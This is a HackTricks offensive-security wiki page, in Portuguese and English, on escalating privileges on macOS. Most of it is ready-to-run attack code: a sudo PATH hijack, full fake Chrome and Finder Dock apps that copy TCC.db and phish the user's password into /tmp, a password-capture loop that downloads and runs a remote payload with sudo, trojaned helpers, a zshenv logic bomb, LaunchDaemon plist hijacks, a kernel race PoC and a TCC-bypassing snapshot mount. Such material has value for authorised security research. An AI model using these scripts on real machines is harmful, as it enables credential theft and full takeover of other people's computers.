# macOS Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## TCC Privilege Escalation

Se você veio aqui procurando por TCC privilege escalation vá para:


{{#ref}}
macos-security-protections/macos-tcc/
{{#endref}}

## Linux Privesc

Por favor note que **a maioria dos truques sobre privilege escalation que afetam Linux/Unix também afetará máquinas MacOS**. Então veja:


{{#ref}}
../../linux-hardening/privilege-escalation/
{{#endref}}

## Interação do Usuário

### Sudo Hijacking

Você pode encontrar a original [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking).

No entanto, macOS **mantém** o **`PATH`** do usuário quando ele executa **`sudo`**. O que significa que outra forma de realizar este ataque seria **hijack other binaries** que a vítima ainda executaria ao **rodar sudo:**
```bash
# Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
cat > /opt/homebrew/bin/ls <<'EOF'
#!/bin/bash
if [ "$(id -u)" -eq 0 ]; then
whoami > /tmp/privesc
fi
/bin/ls "$@"
EOF
chmod +x /opt/homebrew/bin/ls

# victim
sudo ls
```
Observe que um usuário que usa o terminal provavelmente terá o **Homebrew instalado**. Portanto é possível sequestrar binários em **`/opt/homebrew/bin`**.

### Dock Impersonation

Usando um pouco de **social engineering** você poderia **se passar, por exemplo, pelo Google Chrome** dentro do Dock e realmente executar seu próprio script:

{{#tabs}}
{{#tab name="Chrome Impersonation"}}
Algumas sugestões:

- Verifique no Dock se existe o Chrome e, nesse caso, **remova** essa entrada e **adicione** a **falsa** **entrada do Chrome na mesma posição** no array do Dock.

<details>
<summary>Chrome Dock impersonation script</summary>
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%Chrome%';

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /Applications/Google\\\\ Chrome.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c -o /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}

{{#tab name="Finder Impersonation"}}
Algumas sugestões:

- Você **não pode remover Finder do Dock**, então se for adicioná-lo ao Dock, você pode colocar o Finder falso logo ao lado do real. Para isso, você precisa **adicionar a entrada do Finder falso no início do array do Dock**.
- Outra opção é não colocá-lo no Dock e apenas abri-lo, "Finder asking to control Finder" não é tão estranho.
- Outra opção para **escalar para root sem pedir** a senha com uma caixa horrível, é fazer o Finder realmente pedir a senha para executar uma ação privilegiada:
- Peça ao Finder para copiar para **`/etc/pam.d`** um novo arquivo **`sudo`** (O prompt pedindo a senha indicará que "Finder wants to copy sudo")
- Peça ao Finder para copiar um novo **Authorization Plugin** (Você pode controlar o nome do arquivo para que o prompt pedindo a senha indique que "Finder wants to copy Finder.bundle")

<details>
<summary>Script de impersonação do Finder no Dock</summary>
```bash
#!/bin/sh

# THIS REQUIRES Finder TO BE INSTALLED (TO COPY THE ICON)
# If you want to removed granted TCC permissions: > delete from access where client LIKE '%finder%';

rm -rf /tmp/Finder.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Finder.app/Contents/MacOS
mkdir -p /tmp/Finder.app/Contents/Resources

# Payload to execute
cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
char *cmd = "open /System/Library/CoreServices/Finder.app & "
"sleep 2; "
"osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
"echo $PASSWORD > /tmp/passwd.txt";
system(cmd);
return 0;
}
EOF

gcc /tmp/Finder.app/Contents/MacOS/Finder.c -o /tmp/Finder.app/Contents/MacOS/Finder
rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c

chmod +x /tmp/Finder.app/Contents/MacOS/Finder

# Info.plist
cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Finder</string>
<key>CFBundleIdentifier</key>
<string>com.apple.finder</string>
<key>CFBundleName</key>
<string>Finder</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Finder
cp /System/Library/CoreServices/Finder.app/Contents/Resources/Finder.icns /tmp/Finder.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Finder.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
sleep 0.1
killall Dock
```
</details>

{{#endtab}}
{{#endtabs}}

### Password prompt phishing + sudo reuse

Malware frequentemente abusa da interação do usuário para **capturar uma senha com privilégios sudo** e reutilizá-la programaticamente. Um fluxo comum:

1. Identificar o usuário logado com `whoami`.
2. **Repetir prompts de senha** até que `dscl . -authonly "$user" "$pw"` retorne sucesso.
3. Armazenar a credencial em cache (por exemplo, `/tmp/.pass`) e executar ações privilegiadas com `sudo -S` (senha via stdin).

Exemplo de cadeia mínima:
```bash
user=$(whoami)
while true; do
read -s -p "Password: " pw; echo
dscl . -authonly "$user" "$pw" && break
done
printf '%s\n' "$pw" > /tmp/.pass
curl -o /tmp/update https://example.com/update
printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
```
A senha roubada pode então ser reutilizada para **limpar a quarentena do Gatekeeper com `xattr -c`**, copiar LaunchDaemons ou outros arquivos privilegiados, e executar estágios adicionais de forma não interativa.

## Vetores mais recentes específicos do macOS (2023–2025)

### `AuthorizationExecuteWithPrivileges` descontinuado ainda utilizável

`AuthorizationExecuteWithPrivileges` foi descontinuado no 10.7 mas **ainda funciona no Sonoma/Sequoia**. Muitos atualizadores comerciais invocam `/usr/libexec/security_authtrampoline` com um caminho não confiável. Se o binário alvo for gravável pelo usuário, você pode plantar um trojan e aproveitar o prompt legítimo:
```bash
# find vulnerable helper calls
log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'

# replace expected helper
cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
chmod +x /Users/me/Library/Application\ Support/Target/helper
# when the app updates, the root prompt spawns your payload
```
Combine com os **masquerading tricks above** para apresentar um diálogo de senha crível.

### Privileged helper / triagem XPC

Muitas privescs de terceiros modernas no macOS seguem o mesmo padrão: um **root LaunchDaemon** expõe um **Mach/XPC service** em **`/Library/PrivilegedHelperTools`**, então o helper ou **não valida o cliente**, valida **tarde demais** (PID race), ou expõe um **root method** que consome um **user-controlled path/script**. Esta é a classe de bug por trás de muitos bugs recentes de helper em VPN clients, game launchers e updaters.

Checklist rápido de triagem:
```bash
ls -l /Library/PrivilegedHelperTools /Library/LaunchDaemons
plutil -p /Library/LaunchDaemons/*.plist 2>/dev/null | rg 'MachServices|Program|ProgramArguments|Label'
for f in /Library/PrivilegedHelperTools/*; do
echo "== $f =="
codesign -dvv --entitlements :- "$f" 2>&1 | rg 'identifier|TeamIdentifier|com.apple'
strings "$f" | rg 'NSXPC|xpc_connection|AuthorizationCopyRights|authTrampoline|/Applications/.+\.sh'
done
```
Pay special attention to helpers that:

- continuam aceitando requisições **após a desinstalação** porque o job permaneceu carregado em `launchd`
- executam scripts ou leem configurações de **`/Applications/...`** ou outros caminhos graváveis por usuários não-root
- dependem de validação de pares baseada em **PID-based** ou somente **bundle-id-only** que pode ser explorada por condições de corrida

For more details on helper authorization bugs check [this page](macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/macos-xpc-authorization.md).

### Herança do ambiente de script do PackageKit (CVE-2024-27822)

Until Apple fixed it in **Sonoma 14.5**, **Ventura 13.6.7** and **Monterey 12.7.5**, user-initiated installs via **`Installer.app`** / **`PackageKit.framework`** could execute **PKG scripts as root inside the current user's environment**. That means a package using **`#!/bin/zsh`** would load the attacker's **`~/.zshenv`** and run it as **root** when the victim installed the package.

This is especially interesting as a **logic bomb**: you only need a foothold in the user's account and a writable shell startup file, then you wait for any vulnerable **zsh-based** installer to be executed by the user. This does **not** generally apply to **MDM/Munki** deployments because those run inside the root user's environment.
```bash
# inspect a vendor pkg for shell-based install scripts
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec head -n1 {} \;
rg -n '^#!/bin/(zsh|bash)' /tmp/target-pkg

# logic bomb example for vulnerable zsh-based installers
echo 'id > /tmp/pkg-root' >> ~/.zshenv
```
Se quiser um mergulho mais profundo em abuso específico de instaladores, confira também [esta página](macos-files-folders-and-binaries/macos-installers-abuse.md).

### LaunchDaemon plist hijack (CVE-2025-24085 pattern)

Se um LaunchDaemon plist ou o destino em `ProgramArguments` for **gravável pelo usuário**, você pode escalar trocando-o e forçando o launchd a recarregar:
```bash
sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
chmod 755 /Library/PrivilegedHelperTools/securemonitor
cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
<key>Label</key><string>com.apple.securemonitor</string>
<key>ProgramArguments</key>
<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
PLIST
sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
```
Isto espelha o padrão de exploit publicado para **CVE-2025-24085**, onde um writable plist foi abusado para executar código do atacante como root.

### XNU SMR credential race (CVE-2025-24118)

Uma **race em `kauth_cred_proc_update`** permite que um atacante local corrompa o ponteiro de credenciais somente-leitura (`proc_ro.p_ucred`) competindo loops `setgid()`/`getgid()` entre threads até ocorrer um `memcpy` corrompido. A corrupção bem-sucedida resulta em **uid 0** e acesso à memória do kernel. Estrutura mínima de PoC:
```c
// thread A
while (1) setgid(rand());
// thread B
while (1) getgid();
```
Couple com heap grooming para posicionar dados controlados onde ocorrem pointer re-reads. Em builds vulneráveis isso é um **local kernel privesc** confiável sem necessidade de SIP bypass.

### SIP bypass via Migration assistant ("Migraine", CVE-2023-32369)

Se você já tem root, o SIP ainda bloqueia gravações em locais do sistema. O bug **Migraine** abusa da entitlement do Migration Assistant `com.apple.rootless.install.heritable` para iniciar um processo filho que herda o SIP bypass e sobrescreve caminhos protegidos (ex.: `/System/Library/LaunchDaemons`). A cadeia:

1. Obter root em um sistema ao vivo.
2. Acionar `systemmigrationd` com um estado forjado para executar um binário controlado pelo atacante.
3. Usar a entitlement herdada para patchar arquivos protegidos pelo SIP, persistindo mesmo após reboot.

### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)

Vários daemons da Apple aceitam objetos **NSPredicate** via **XPC** e só validam o campo `expressionType`, que é controlado pelo atacante. Ao criar um predicate que avalia selectors arbitrários você pode alcançar **code execution** em serviços XPC rodando como root/system (ex.: `coreduetd`, `contextstored`). Quando combinado com uma app sandbox escape inicial, isso concede **privilege escalation** sem prompts do usuário. Procure endpoints XPC que desserializem predicates e que não implementem um visitor robusto.

## TCC - Root Privilege Escalation

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Any user** (mesmo os sem privilégios) pode criar e montar um snapshot do Time Machine e **acessar TODOS os arquivos** desse snapshot.\
O **único privilégio** necessário é que a aplicação usada (como `Terminal`) tenha **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), o qual precisa ser concedido por um admin.

<details>
<summary>Mount Time Machine snapshot</summary>
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
</details>

Uma explicação mais detalhada pode ser [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

## Informações Sensíveis

Isto pode ser útil para escalar privilégios:


{{#ref}}
macos-files-folders-and-binaries/macos-sensitive-locations.md
{{#endref}}

## Referências

- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
- [CVE-2024-27822: macOS PackageKit Privilege Escalation](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [CVE-2024-30165: AWS Client VPN for macOS Local Privilege Escalation](https://blog.emkay64.com/macos/CVE-2024-30165-finding-and-exploiting-aws-client-vpn-on-macos-for-local-privilege-escalation/)

{{#include ../../banners/hacktricks-training.md}}
